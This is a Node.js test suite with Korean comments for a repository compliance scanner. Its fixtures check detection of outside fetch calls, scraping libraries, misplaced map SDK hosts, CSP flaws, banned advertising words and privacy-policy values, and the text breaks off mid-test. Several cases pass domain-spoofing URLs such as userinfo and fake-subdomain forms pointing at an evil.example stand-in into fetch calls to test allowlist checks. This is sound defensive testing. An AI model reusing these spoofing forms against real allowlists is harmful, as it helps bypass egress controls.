// scripts/compliance-scan.mjs — 규칙별 주입(exit 1 + 규칙 ID) / 깨끗(exit 0) 양방향 테스트.
//   R3 계획 §5 C1-FETCH ~ C8-OUT-SAFE, §6-1 정규화, D8/D9/D10.
//   이 파일도 실트리 스캔 대상이다(scripts/__tests__ 제외 안 함) — 위반 문자열은 전부 j(...)로 런타임 조립한다.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync, existsSync, unlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { brotliCompressSync, gzipSync } from 'node:zlib';

const HERE = dirname(fileURLToPath(import.meta.url));
const SCANNER = resolve(HERE, '..', 'compliance-scan.mjs');
const j = (...parts) => parts.join('');
/** 노출 기준일 — 고정(실시계 결합 0, F14). meta().verifiedAt + 1일. */
const FIXED_NOW = '2026-10-01';

// ── 조립 문자열(소스에 위반 리터럴 0) ─────────────────────────
const HTTPS = j('htt', 'ps://');
const MAP_HOST = j('oapi.map.', 'naver.com');
const PST_HOST = j('*.pst', 'atic.net');
const OPENAPI_HOST = j('open', 'api.', 'naver.com');
const FETCH = j('fe', 'tch');
const KO = {
  okay: j('괜', '찮다'),
  safe: j('안', '전하다'),
  cheapest: j('최', '저가'),
  bySales: j('판', '매순'),
  best: j('베', '스트'),
  accuracy: j('정', '확도'),
  signup: j('회원', '가입'),
  purchase: j('구', '매'),
  safeStem: j('안', '전'),
  okayStem: j('괜', '찮'),
  expertN: j('전문', '가'),
};

const BANNED_WORDS = {
  v: 1,
  banned: [
    { term: KO.okay, pattern: KO.okay },
    { term: KO.safe, pattern: KO.safe },
    { term: KO.cheapest, pattern: KO.cheapest },
    { term: KO.bySales, pattern: KO.bySales },
    { term: KO.best, pattern: KO.best },
    { term: KO.accuracy, pattern: KO.accuracy },
    {
      term: j(KO.expertN, ' N명'),
      pattern: j(KO.expertN, '\\s*(?:\\d+|[한두세네다섯여섯일곱여덟아홉열스물서른마흔쉰백천일이삼사오육칠팔구십]+)\\s*명'),
    },
    { term: KO.signup, pattern: KO.signup },
    { term: KO.purchase, pattern: KO.purchase },
  ],
  stems: [
    { term: KO.safeStem, pattern: KO.safeStem },
    { term: KO.okayStem, pattern: KO.okayStem },
  ],
};

const meta = (over = {}) => ({
  reviewStatus: 'VERIFIED',
  reviewerType: 'EXPERIENCED_KEEPER',
  verifiedBy: 'keeper-kim',
  verifiedAt: '2026-09-30',
  contentKind: 'SPEC',
  source: [{ url: j(HTTPS, 'example.org/care'), title: 'care guide', accessedAt: '2026-09-30' }],
  ...over,
});

function baseSeed() {
  return {
    'animal-types.json': [
      {
        id: 'hamster-golden', slug: 'hamster/golden', group: 'SMALL_MAMMAL', displayName: '골든햄스터', status: 'ACTIVE',
        aliases: ['시리안햄스터'], taxonId: 'tx-fixture', careProfileId: 'cp-syrian', careOverrides: {}, oneLiner: '단독 사육', ...meta({ contentKind: 'CARE' }),
      },
      {
        id: 'hamster-dwarf', slug: 'hamster/dwarf', group: 'SMALL_MAMMAL', displayName: '드워프햄스터', status: 'PLANNED',
        aliases: [], taxonId: null, careProfileId: null, careOverrides: {}, ...meta({ reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null }),
      },
    ],
    // 합성 종 자리표시(실제 종·법 사실 아님) — Taxon 참조 공개 규칙 검사용(타입 노출은 Taxon 을 보지 않음, K-4 되돌림).
    'taxa.json': [
      {
        id: 'tx-fixture', scientificName: 'Fixtura testa', koreanName: '픽스처종', legal: { animalProtectionAct6: false, cites: false, designatedWildlifeWhitelist: null, note: null },
        revisionOf: null, ...meta({ contentKind: 'LEGAL', reviewerType: 'OFFICIAL_SOURCE' }),
      },
    ],
    'care-profiles.json': [{ id: 'cp-syrian', name: '골든햄스터 기본', taxonIds: [], facts: {}, careNotes: ['단독 사육'], ...meta({ contentKind: 'CARE' }) }],
    'supply-items.json': [
      { id: 'cage', name: '케이지', category: 'CAGE', lifecycle: 'DURABLE', specSchema: { fields: [] }, compatibleAlternativeIds: [], description: '바닥 면적이 우선', ...meta() },
      { id: 'wheel', name: '쳇바퀴', category: 'WHEEL', lifecycle: 'DURABLE', specSchema: { fields: [] }, compatibleAlternativeIds: [], description: '통면', ...meta({ reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null }) },
    ],
    'supply-requirements.json': [
      {
        id: 'req-cage', careProfileId: 'cp-syrian', supplyItemId: 'cage', priority: 'REQUIRED', orderHint: 'BEFORE_ARRIVAL',
        why: '바닥을 넓게 써요', caution: null, avoid: null, searchKeyword: '햄스터 케이지',
        minSpec: { rules: [{ key: 'floorWcm', op: 'gte', value: 60, reason: '활동 바닥' }] }, recommendedSpec: { rules: [] }, ...meta(),
      },
      {
        id: 'req-wheel', careProfileId: 'cp-syrian', supplyItemId: 'wheel', priority: 'REQUIRED', orderHint: 'BEFORE_ARRIVAL',
        why: '많이 달려요', caution: null, avoid: null, searchKeyword: '햄스터 쳇바퀴',
        minSpec: { rules: [] }, recommendedSpec: { rules: [] }, ...meta(),
      },
    ],
    'compatibility-rules.json': [],
    'setup-bundles.json': [
      { id: 'sb-1', careProfileId: 'cp-syrian', tier: 'BUDGET', name: '실속', purpose: '기준은 지키고', itemIds: ['cage'], estimatedRangeText: null, note: null, ...meta({ contentKind: 'CARE' }) },
    ],
    'curated-products.json': [
      {
        id: 'cp-001', supplyItemId: 'cage', careProfileIds: ['cp-syrian'], title: '넓은 케이지', imageAsset: '/assets/products/cp-001.webp',
        specValues: { floorWcm: 80 }, meetsMinSpec: true, specVerifiedBy: 'op', specVerifiedAt: '2026-09-30', status: 'ACTIVE', imageLicense: 'OWN_PHOTO', ...meta(),
      },
      {
        id: 'cp-002', supplyItemId: 'cage', careProfileIds: ['cp-syrian'], title: '작은 케이지', imageAsset: null,
        specValues: { floorWcm: 40 }, meetsMinSpec: false, specVerifiedBy: null, specVerifiedAt: null, status: 'SLOT', imageLicense: 'NONE', ...meta({ reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null }),
      },
    ],
    'testimonials.json': [
      { id: 't-001', quote: '', animalTypeId: 'hamster-golden', situation: 'FIRST_TIME', linkedAction: 'CHECKLIST', verifiedUsage: false, source: 'BETA', consentAt: null, status: 'SLOT', reviewerImage: null, reviewerImageConsent: false },
    ],
    'vet-clinics.json': [
      {
        id: 'vc-1', name: '마포 동물병원', region: '서울 마포구', treats: ['hamster-golden'], night: false, emergency: false, phone: '02-000-0000', address: '서울 마포구',
        lat: 37.5, lng: 126.9, verification: { status: 'VERIFIED', method: 'PHONE_CALL', verifiedAt: '2026-09-30', note: '' },
      },
    ],
    'photos.json': [
      { id: 'ph-01', scene: 'x', slot: 'intro-1', query: 'q', source: null, license: null, author: null, sourceUrl: null, downloadedAt: null, modified: false, status: 'SLOT' },
    ],
  };
}

const GUARD_TEST = [
  "import { isVerified, isTestimonialExposable } from '../engine/index.js';",
  "it('V01 AI_DRAFT', () => { expect(issues('V01')).toContain('AI_DRAFT'); });",
  "it('isVerified AI_DRAFT', () => { expect(isVerified({ reviewerType: 'AI_DRAFT' })).toBe(false); });",
  "it('t', () => { expect(isTestimonialExposable({})).toBe(false); });",
  '',
].join('\n');

/**
 * spa.ts 픽스처(D21 구조: 기본 SPA_CSP·공통 꼬리·VET_CSP·cspForPath). QA-M D3 — 변이는 인수로 주입.
 *   spaExtra: SPA_CSP script-src 뒤에 붙일 텍스트, tailExtra: 공통 꼬리에 넣을 항목, pick: cspForPath 본문.
 */
function spaTs({ spaExtra = '', tailExtra = '', pick = "p === '/vet' || p.startsWith('/vet/') ? VET_CSP : SPA_CSP" } = {}) {
  return [
    'const CSP_COMMON_TAIL = [',
    `  "base-uri 'none'",${tailExtra}`,
    '];',
    'export const SPA_CSP = [',
    `  "default-src 'self'",`,
    `  "script-src 'self'${spaExtra}",`,
    '  ...CSP_COMMON_TAIL,',
    "].join('; ');",
    'export const VET_CSP = [',
    j(`  "script-src 'self' `, HTTPS, MAP_HOST, '",'),
    j(`  "img-src 'self' https://`, PST_HOST, '",'),
    '  ...CSP_COMMON_TAIL,',
    "].join('; ');",
    'export function cspForPath(p) {',
    `  return ${pick};`,
    '}',
    '',
  ].join('\n');
}

function baseSource() {
  return {
    'package.json': JSON.stringify({ name: 'fx', private: true }),
    'client/package.json': JSON.stringify({ name: 'c', dependencies: { react: '^18' }, devDependencies: { jsdom: '^29' } }),
    'server/package.json': JSON.stringify({ name: 's', dependencies: { express: '^4' } }),
    'client/src/app.ts': j("export const load = () => ", FETCH, "('/api/vets');\n"),
    'client/src/map/loader.ts': j("export const SDK = '", HTTPS, MAP_HOST, "/openapi/v3/maps.js';\n"),
    'server/src/middleware/spa.ts': spaTs(),
    'server/src/vet/vet.prisma.repo.ts': [
      "import { VET_LISTED_STATUS } from '../engine/exposure.js';",
      'export const list = (prisma) => prisma.vetClinic.findMany({ where: { status: VET_LISTED_STATUS } });',
      '',
    ].join('\n'),
    'server/src/__tests__/guards.test.ts': GUARD_TEST,
    'server/src/seed/banned-words.json': JSON.stringify(BANNED_WORDS, null, 2),
    'server/prisma/schema.prisma': 'model VetClinic {\n  id String @id\n  lat Float?\n  lng Float?\n}\n',
    'scripts/tool.mjs': 'export const ok = 1;\n',
    'server/src/privacy/policy.ts': POLICY_TS,
  };
}

// ── C9-PRIVACY 픽스처(계획 86 P11) ─────────────────────────────
const POLICY_TS = [
  'export const DAY_MS = 24 * 60 * 60 * 1000;',
  'export const UNUSED_USER_RETENTION_DAYS = 365;',
  'export const EVENT_LOG_RETENTION_DAYS = 90;',
  'export const MAGIC_TOKEN_RETENTION_MS = 0;',
  "export const BACKUP_DIR_ENV = 'WS_BACKUP_DIR';",
  '',
].join('\n');
const KENNY = j('{{KEN', 'NY:officerName}}');
const policySpan = (name, v) => `<span data-ws-policy="${name}">${v}</span>`;
function privacyMain({ user = 365, event = 90, placeholder = false } = {}) {
  return [
    '<main class="ws-page" data-ws-route="PRIVACY"><h1>개인정보 처리방침</h1>',
    `<p>마지막으로 쓴 날부터 ${policySpan('UNUSED_USER_RETENTION_DAYS', user)}일 동안 쓰지 않으면 지워요.</p>`,
    `<p>이용 통계는 ${policySpan('EVENT_LOG_RETENTION_DAYS', event)}일 동안 보관해요.</p>`,
    placeholder ? `<p>성명: ${KENNY}</p>` : '',
    '</main>',
  ].join('');
}

// ── 산출물(dist) 픽스처 ─────────────────────────────────────
const SAFE_HEAD = '<title>WithSmall</title><meta name="description" content="작은 반려동물 준비">';
function page(body, wsData = { v: 1, data: { types: [], requirements: [], products: [], bundles: [], vets: [], testimonials: [] } }) {
  return [
    '<!doctype html><html lang="ko"><head>', SAFE_HEAD,
    '<link rel="canonical" href="http://localhost:3001/">',
    '<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[]}</script>',
    '</head><body><div id="root" data-ws-prerendered="1">',
    '<header class="ws-header"><a href="/">WithSmall</a></header>',
    body,
    '<footer><a href="/vet">병원</a><a href="/privacy">개인정보 처리방침</a></footer>',
    '</div>',
    '<script id="ws-data" type="application/json">', JSON.stringify(wsData), '</script>',
    '<script type="module" src="/assets/index-abc.js"></script>',
    '<script id="vite-plugin-pwa:register-sw" src="/registerSW.js"></script>',
    '</body></html>',
  ].join('');
}

function baseOutput() {
  const typeData = {
    v: 1,
    route: { kind: 'TYPE', path: '/hamster/golden', typeId: 'hamster-golden' },
    layer: null,
    catalogUrl: '/data/catalog.v1.abcd1234.json',
    data: {
      types: [{ id: 'hamster-golden', slug: 'hamster/golden', displayName: '골든햄스터' }],
      requirements: [{ animalTypeId: 'hamster-golden', supplyItemId: 'cage', why: '바닥을 넓게 써요', item: { id: 'cage', name: '케이지', alternativeIds: [] } }],
      products: [{ id: 'cp-001', supplyItemId: 'cage', title: '넓은 케이지' }],
      bundles: [{ id: 'sb-1', name: '실속' }],
      vets: [{ id: 'vc-1', name: '마포 동물병원' }],
      testimonials: [],
    },
  };
  return {
    'index.html': page('<main class="ws-page" data-ws-route="HOME"><section data-ws-section="now"><h2>지금 필요한 것</h2></section></main>'),
    'hamster/golden/index.html': page(
      [
        '<main class="ws-page" data-ws-route="TYPE" data-ws-type="hamster-golden">',
        '<section data-ws-section="now"><ul><li data-ws-id="supplyRequirements#req-cage"><a href="/hamster/golden/supplies/cage">케이지</a></li></ul></section>',
        '<section data-ws-section="products"><article data-ws-id="curatedProducts#cp-001"><img src="/assets/products/cp-001.webp" alt="넓은 케이지"></article></section>',
        j('<a href="', HTTPS, 'www.coupang.com/np/search?q=x" rel="noopener noreferrer">쿠팡에서 찾기</a>'),
        '</main>',
      ].join(''),
      typeData,
    ),
    'privacy/index.html': page(privacyMain()),
    'robots.txt': 'User-agent: *\nDisallow: /\n',
    'sitemap.xml': '<?xml version="1.0"?><urlset><url><loc>http://localhost:3001/</loc></url><url><loc>http://localhost:3001/hamster/golden</loc></url></urlset>',
    'data/catalog.v1.abcd1234.json': JSON.stringify({
      v: 1,
      animalTypes: [{ id: 'hamster-golden', displayName: '골든햄스터' }],
      careProfiles: [{ id: 'cp-syrian' }],
      supplyItems: [{ id: 'cage', name: '케이지' }],
      supplyRequirements: [{ id: 'req-cage', why: '바닥을 넓게 써요' }],
      compatibilityRules: [],
    }),
  };
}

function manifestFor(seedDigest, over = {}) {
  return {
    v: 1,
    seedDigest,
    indexable: false,
    mode: 'development',
    routes: [
      { path: '/', file: 'index.html', kind: 'HOME', indexable: true },
      { path: '/hamster/golden', file: 'hamster/golden/index.html', kind: 'TYPE', typeId: 'hamster-golden', indexable: true },
      { path: '/privacy', file: 'privacy/index.html', kind: 'PRIVACY', indexable: true },
    ],
    ...over,
  };
}

// ── 픽스처 생성·실행 ─────────────────────────────────────────
const made = [];
function writeTree(root, files) {
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(root, ...rel.split('/'));
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, typeof content === 'string' ? content : JSON.stringify(content, null, 2));
  }
}

/** opts: { source(files), seed(seed), output(files)|null, manifest(digest)=>obj|null } */
async function makeRoot({ source, seed, output, manifest } = {}) {
  const root = mkdtempSync(join(tmpdir(), 'compliance-scan-'));
  made.push(root);
  const src = baseSource();
  if (source) source(src);
  writeTree(root, src);
  const sd = baseSeed();
  if (seed) seed(sd);
  const seedFiles = {};
  for (const [f, rows] of Object.entries(sd)) seedFiles[`server/seed/${f}`] = rows;
  writeTree(root, seedFiles);
  if (output !== null && output !== undefined) {
    const out = baseOutput();
    output(out);
    const dist = {};
    for (const [f, c] of Object.entries(out)) dist[`client/dist/${f}`] = c;
    writeTree(root, dist);
    const { seedDigest } = await import('../lib/seed-exposure.mjs');
    const digest = seedDigest(join(root, 'server', 'seed'));
    const m = (manifest ?? manifestFor)(digest);
    if (m) writeTree(root, { 'client/dist/prerender-manifest.json': m });
  }
  return root;
}

/** --now 를 주지 않으면 FIXED_NOW. */
function scan(root, ...flags) {
  const now = flags.includes('--now') ? [] : ['--now', FIXED_NOW];
  const r = spawnSync(process.execPath, [SCANNER, '--root', root, '--json', ...now, ...flags], { encoding: 'utf8' });
  let json = null;
  try {
    json = JSON.parse(r.stdout);
  } catch {
    json = null;
  }
  return { code: r.status, json, stdout: r.stdout, stderr: r.stderr };
}

const rulesOf = (res, severity) =>
  (res.json?.findings ?? []).filter((f) => !severity || f.severity === severity).map((f) => f.rule);

function expectFail(res, rule) {
  assert.equal(res.code, 1, `exit 1 기대, 실제 ${res.code}\n${res.stdout}\n${res.stderr}`);
  assert.ok(rulesOf(res, 'FAIL').includes(rule), `${rule} FAIL 기대, 실제 ${JSON.stringify(res.json?.findings)}`);
}

function expectClean(res) {
  assert.equal(res.code, 0, `exit 0 기대, 실제 ${res.code}\n${res.stdout}\n${res.stderr}`);
  assert.deepEqual(rulesOf(res, 'FAIL'), []);
}

const noop = () => {};

after(() => {
  for (const d of made) rmSync(d, { recursive: true, force: true });
});

// ── 깨끗한 트리 ─────────────────────────────────────────────
test('clean: 소스+시드만(산출물 없음) → exit 0, outputs NOT RUN', async () => {
  const res = scan(await makeRoot());
  expectClean(res);
  assert.equal(res.json.outputs, 'NOT RUN');
});

test('clean: 산출물 포함 → exit 0, outputs RUN', async () => {
  const res = scan(await makeRoot({ output: noop }));
  expectClean(res);
  assert.equal(res.json.outputs, 'RUN');
});

test('--require-output: manifest 없으면 exit 1 NOT RUN', async () => {
  const res = scan(await makeRoot(), '--require-output');
  expectFail(res, 'C0-OUTPUT');
  assert.match(JSON.stringify(res.json), /NOT RUN/);
});

test('--require-output: 산출물 있으면 exit 0', async () => {
  expectClean(scan(await makeRoot({ output: noop }), '--require-output'));
});

test('설정 오류: banned-words.json 없음 → exit 2', async () => {
  const root = await makeRoot();
  unlinkSync(join(root, 'server', 'src', 'seed', 'banned-words.json'));
  assert.equal(scan(root).code, 2);
});

test('설정 오류: banned-words.json 형식 오류 → exit 2', async () => {
  const root = await makeRoot({ source: (s) => { s['server/src/seed/banned-words.json'] = '{ "v": 1, "banned": [ "x\\q" ] '; } });
  assert.equal(scan(root).code, 2);
});

test('사람용 출력: 위반 시 FAIL 요약 + 파일:라인', async () => {
  const root = await makeRoot({ source: (s) => { s['client/src/x.ts'] = j('const a = 1;\n', FETCH, '("', HTTPS, 'shop.ex/p");\n'); } });
  const r = spawnSync(process.execPath, [SCANNER, '--root', root, '--now', FIXED_NOW], { encoding: 'utf8' });
  assert.equal(r.status, 1);
  assert.match(r.stdout, /FAIL C1-FETCH client\/src\/x\.ts:2/);
});

// ── C1 무크롤링 ─────────────────────────────────────────────
test('C1-FETCH: 외부 절대 URL fetch', async () => {
  expectFail(scan(await makeRoot({ source: (s) => { s['client/src/x.ts'] = j(FETCH, '("', HTTPS, 'shop.ex/p");\n'); } })), 'C1-FETCH');
});

test('C1-FETCH: 상수 경유 간접 호출', async () => {
  const src = j("const U = '", HTTPS, "shop.ex/p';\nexport const go = () => ", FETCH, '(U);\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/x.ts'] = src; } })), 'C1-FETCH');
});

test('C1-FETCH: scripts/ 도 대상, WebSocket 외부', async () => {
  expectFail(scan(await makeRoot({ source: (s) => { s['scripts/x.mjs'] = j("new WebSocket('wss://", 'feed.ex/s', "');\n"); } })), 'C1-FETCH');
});

test('C1-FETCH: localhost·상대경로·주석은 통과', async () => {
  const src = j(FETCH, "('http://localhost:3001/api');\n// ", FETCH, '("', HTTPS, 'shop.ex/p")\n', FETCH, "('/api/x');\n");
  expectClean(scan(await makeRoot({ source: (s) => { s['client/src/x.ts'] = src; } })));
});

test('C1-LIB: 코드 import', async () => {
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/x.ts'] = j("import * as c from '", 'chee', "rio';\n"); } })), 'C1-LIB');
});

test('C1-LIB: package.json deps', async () => {
  const pkg = { name: 's', dependencies: { [j('puppe', 'teer')]: '^1' } };
  expectFail(scan(await makeRoot({ source: (s) => { s['server/package.json'] = JSON.stringify(pkg); } })), 'C1-LIB');
});

test('C1-LIB: jsdom 은 devDependencies 만', async () => {
  const pkg = { name: 'c', dependencies: { jsdom: '^29' } };
  expectFail(scan(await makeRoot({ source: (s) => { s['client/package.json'] = JSON.stringify(pkg); } })), 'C1-LIB');
});

// R6 B4(Kenny: Resend): C1-FETCH 허용목록 api.resend.com 은 server/src/save/mail.ts 한 파일만.
const RESEND_HOST = j('api.re', 'send.com');
const MAIL_FILE = 'server/src/save/mail.ts';
const resendSrc = (url) => j("export const RESEND_ENDPOINT = '", url, "';\nawait ", FETCH, "(RESEND_ENDPOINT, { method: 'POST' });\n");
const resendInline = (url) => j('await ', FETCH, "('", url, "', { method: 'POST' });\n");

test('C1-FETCH 허용: mail.ts 에서 https://api.resend.com 상수·인라인 호출 → 통과', async () => {
  const res = scan(await makeRoot({
    source: (s) => {
      s[MAIL_FILE] = j(resendSrc(j(HTTPS, RESEND_HOST, '/emails')), resendInline(j(HTTPS, RESEND_HOST, '/emails')));
    },
  }));
  expectClean(res);
  assert.ok(!rulesOf(res).includes('C1-FETCH'));
});

test('C1-FETCH 허용 밖: 다른 파일(테스트·클라·save 형제 파일 포함)에서 api.resend.com 호출 → FAIL', async () => {
  for (const rel of ['server/src/save/mail2.ts', 'server/src/app.ts', 'client/src/x.ts', 'scripts/x.mjs', 'e2e/support/x.ts', 'server/src/save/__tests__/mail.ts']) {
    expectFail(scan(await makeRoot({ source: (s) => { s[rel] = resendSrc(j(HTTPS, RESEND_HOST, '/emails')); } })), 'C1-FETCH');
  }
});

test('C1-FETCH 허용 밖: mail.ts 라도 다른 외부 호스트·http·하위/위장 도메인·포트·userinfo → FAIL', async () => {
  for (const url of [
    j(HTTPS, 'api.sendgrid.com/v3/mail/send'),
    j('htt', 'p://', RESEND_HOST, '/emails'),
    j(HTTPS, 'x.', RESEND_HOST, '/emails'),
    j(HTTPS, RESEND_HOST, '.evil.example/emails'),
    j(HTTPS, RESEND_HOST, ':8443/emails'),
    j(HTTPS, RESEND_HOST, '@evil.example/emails'),
  ]) {
    expectFail(scan(await makeRoot({ source: (s) => { s[MAIL_FILE] = resendSrc(url); } })), 'C1-FETCH');
    expectFail(scan(await makeRoot({ source: (s) => { s[MAIL_FILE] = resendInline(url); } })), 'C1-FETCH');
  }
});

// R6 오케스트레이터 결정: @playwright/test 좁은 예외(루트 devDependencies · e2e/** · 루트 playwright.config.ts 만).
const PW_TEST = j('@play', 'wright/test');
const pwImport = (name = PW_TEST) => j("import { test } from '", name, "';\n");
const rootPkg = (sec, name = PW_TEST) => JSON.stringify({ name: 'fx', private: true, [sec]: { [name]: '^1.64.0' } });

test('C1-LIB 예외: @playwright/test 루트 devDependencies + e2e/** · playwright.config.ts import → 통과', async () => {
  const res = scan(await makeRoot({
    source: (s) => {
      s['package.json'] = rootPkg('devDependencies');
      s['playwright.config.ts'] = j("import { defineConfig } from '", PW_TEST, "';\nexport default defineConfig({});\n");
      s['e2e/smoke.spec.ts'] = pwImport();
      s['e2e/support/fixtures.ts'] = pwImport();
    },
  }));
  expectClean(res);
  assert.ok(!rulesOf(res).includes('C1-LIB'));
});

test('C1-LIB 예외 밖: @playwright/test 를 server/src·client/src·scripts·루트 다른 파일에서 import → FAIL', async () => {
  for (const rel of ['server/src/x.ts', 'client/src/x.ts', 'scripts/x.mjs', 'vite.e2e.ts', 'server/src/__tests__/x.test.ts']) {
    expectFail(scan(await makeRoot({ source: (s) => { s[rel] = pwImport(); } })), 'C1-LIB');
  }
});

test('C1-LIB 예외 밖: @playwright/test 가 dependencies·워크스페이스 package.json 에 → FAIL', async () => {
  for (const mut of [
    (s) => { s['package.json'] = rootPkg('dependencies'); },
    (s) => { s['package.json'] = rootPkg('optionalDependencies'); },
    (s) => { s['server/package.json'] = rootPkg('devDependencies'); },
    (s) => { s['client/package.json'] = rootPkg('devDependencies'); },
  ]) {
    expectFail(scan(await makeRoot({ source: mut })), 'C1-LIB');
  }
});

test('C1-LIB 예외 밖: 다른 playwright·puppeteer 패키지는 e2e·루트 devDependencies 여도 FAIL', async () => {
  for (const name of [j('play', 'wright'), j('play', 'wright-core'), j('@play', 'wright/test/reporter'), j('@play', 'wright/browser-chromium'), j('puppe', 'teer')]) {
    expectFail(scan(await makeRoot({ source: (s) => { s['e2e/smoke.spec.ts'] = pwImport(name); } })), 'C1-LIB');
    expectFail(scan(await makeRoot({ source: (s) => { s['package.json'] = rootPkg('devDependencies', name); } })), 'C1-LIB');
  }
});

test('C1-SDK: 지도 SDK 호스트가 허용 파일 밖', async () => {
  const src = j("const s = document.createElement('script'); s.src = '", HTTPS, MAP_HOST, "/maps.js';\n");
  expectFail(scan(await makeRoot({ source: (s) => { s['client/src/home/x.ts'] = src; } })), 'C1-SDK');
});

// R5 C1-SDK 분리: 하위 도메인 없는 웹 호스트 map.naver.com 은 engine/links.ts(+테스트)만, SDK 호스트는 거기서도 금지.
const WEB_MAP_HOST = j('map.', 'naver.com');
const webLink = j("export const U = '", HTTPS, WEB_MAP_HOST, "/p/search/';\n");
test('C1-SDK: 웹 딥링크 호스트가 클라 파일(지도 폴더 포함)·다른 서버 파일에 → 실패', async () => {
  for (const f of ['client/src/vet/VetCard.tsx', 'client/src/map/x.ts', 'server/src/prerender/pages/common.ts', 'server/src/engine/other.ts']) {
    expectFail(scan(await makeRoot({ source: (s) => { s[f] = webLink; } })), 'C1-SDK');
  }
});
test('C1-SDK: 웹 딥링크 호스트가 engine/links.ts·engine.links.test.ts 에 → 통과', async () => {
  for (const f of ['server/src/engine/links.ts', 'server/src/__tests__/engine.links.test.ts']) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = webLink; } }));
    assert.ok(!rulesOf(res, 'FAIL').includes('C1-SDK'), `${f}: ${JSON.stringify(res.json?.findings)}`);
  }
});
test('C1-SDK: SDK 호스트(oapi·openapi.map·pstatic·하위 도메인 위장)는 engine/links.ts·그 테스트에서도 실패', async () => {
  const sdkHosts = [MAP_HOST, j('openapi.map.', 'naver.com'), j('ssl.pstatic', '.net'), j('x', WEB_MAP_HOST)];
  for (const f of ['server/src/engine/links.ts', 'server/src/__tests__/engine.links.test.ts']) {
    for (const h of sdkHosts) {
      expectFail(scan(await makeRoot({ source: (s) => { s[f] = j("export const U = '", HTTPS, h, "/a';\n"); } })), 'C1-SDK');
    }
  }
});
test('C1-SDK: SDK 호스트는 client/src/map·spa.ts 에서 통과', async () => {
  // spa.ts 는 D21 구조(VET_CSP 안의 SDK 호스트) — 기본 픽스처 spaTs() 가 그 자체로 통과해야 한다.
  const files = { 'client/src/map/x.ts': j("export const U = '", HTTPS, MAP_HOST, "/maps.js';\n"), 'server/src/middleware/spa.ts': spaTs() };
  for (const [f, text] of Object.entries(files)) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.ok(!rulesOf(res, 'FAIL').includes('C1-SDK'), `${f}: ${JSON.stringify(res.json?.findings)}`);
  }
});

// QA-M D3(심층 방어): spa.ts 기본 CSP 에 지도 호스트·전 경로 VET_CSP → 실패.
test('C1-SDK(CSP): SPA_CSP·공통 꼬리에 naver/pstatic, VET_CSP 전 경로 적용, VET_CSP 밖 지도 호스트, SPA_CSP 없음 → 실패', async () => {
  const bad = [
    spaTs({ spaExtra: j(' ', HTTPS, MAP_HOST) }),
    spaTs({ spaExtra: j(' ', HTTPS, PST_HOST) }),
    spaTs({ tailExtra: j(`\n  "connect-src 'self' `, HTTPS, MAP_HOST, '",') }),
    spaTs({ pick: 'VET_CSP' }),
    spaTs({ pick: "p.startsWith('/') ? VET_CSP : SPA_CSP" }),
    j(spaTs(), "export const ALL = (res) => res.setHeader('Content-Security-Policy', VET_CSP);\n"),
    j(spaTs(), "export const X = \"img-src ", HTTPS, PST_HOST, "\";\n"),
    spaTs().replace(/SPA_CSP/g, 'DEFAULT_CSP'),
  ];
  for (const text of bad) expectFail(scan(await makeRoot({ source: (s) => { s['server/src/middleware/spa.ts'] = text; } })), 'C1-SDK');
});

test('C1-SDK: 쇼핑 오픈API 호스트 전면 금지(허용 파일 안이어도)', async () => {
  const src = j("export const U = '", HTTPS, OPENAPI_HOST, "/v1/search';\n");
  expectFail(scan(await makeRoot({ source: (s) => { s['client/src/map/x.ts'] = src; } })), 'C1-SDK');
});

// 2026-10-27(Kenny: 검색 키워드 실효성 검증): 쇼핑 오픈API·쿠팡 게이트웨이 호스트는 개발 전용 도구 한 파일에서만.
const DEV_SEARCH_FILE = 'scripts/dev/check-search-keywords.mjs';
const COUPANG_GW_HOST = j('api-gate', 'way.coupang.com');
const devSearchSrc = (naverUrl, coupangUrl) =>
  j(
    "export const NAVER = '", naverUrl, "';\n",
    "export const CP = '", coupangUrl, "';\n",
    'await ', FETCH, '(NAVER);\n',
    'await ', FETCH, '(CP);\n',
    'await ', FETCH, "('", naverUrl, "?query=x');\n",
  );
const devOk = () => devSearchSrc(j(HTTPS, OPENAPI_HOST, '/v1/search/shop.json'), j(HTTPS, COUPANG_GW_HOST, '/v2/x'));

test('C1-FETCH·C1-SDK 허용: scripts/dev/check-search-keywords.mjs 의 https 쇼핑 오픈API·쿠팡 게이트웨이 호출 → 통과', async () => {
  const res = scan(await makeRoot({ source: (s) => { s[DEV_SEARCH_FILE] = devOk(); } }));
  expectClean(res);
  assert.ok(!rulesOf(res).includes('C1-FETCH') && !rulesOf(res).includes('C1-SDK'), JSON.stringify(res.json?.findings));
});

test('허용 밖: 같은 코드가 다른 파일(형제·scripts·server·client·테스트)에 있으면 C1-SDK·C1-FETCH FAIL 유지', async () => {
  for (const rel of ['scripts/dev/other.mjs', 'scripts/check-search-keywords.mjs', 'scripts/__tests__/check-search-keywords.mjs', 'server/src/x.ts', 'client/src/x.ts', 'e2e/x.ts']) {
    const res = scan(await makeRoot({ source: (s) => { s[rel] = devOk(); } }));
    expectFail(res, 'C1-SDK');
    expectFail(res, 'C1-FETCH');
  }
  // 쿠팡 게이트웨이만 있어도 다른 파일이면 C1-FETCH.
  const cp = j("export const CP = '", HTTPS, COUPANG_GW_HOST, "/v2/x';\nawait ", FETCH, '(CP);\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['scripts/x.mjs'] = cp; } })), 'C1-FETCH');
});

test('허용 파일이라도 http·하위/위장 도메인·포트·userinfo·대문자·다른 외부 호스트 → FAIL', async () => {
  const badNaver = [
    j('htt', 'p://', OPENAPI_HOST, '/v1'),
    j(HTTPS, 'x.', OPENAPI_HOST, '/v1'),
    j(HTTPS, OPENAPI_HOST, '.evil.example/v1'),
